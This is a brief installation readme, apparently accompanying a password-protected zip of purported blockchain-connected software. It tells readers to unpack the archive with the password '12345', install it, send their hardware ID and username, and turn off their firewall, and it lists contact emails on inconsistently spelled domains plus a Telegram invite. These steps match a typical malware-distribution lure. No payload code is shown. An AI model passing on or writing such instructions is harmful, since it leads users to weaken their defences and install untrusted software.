1.Unpack ZipArchive (Pass: 12345)

2.Install software

3.Send me your HW ID number and Your username

4 Your license code will be send to you

5.Because an aplication connects to blockchain,please switch off your firewall to get better results

6.Injoy

Contacts:

support@luxuriousoftware.com

sales@luxuriousofware.com

Telegram channel:

http://t.me/joinchat/AAAAAELCJrCxt-HMqcpJOA



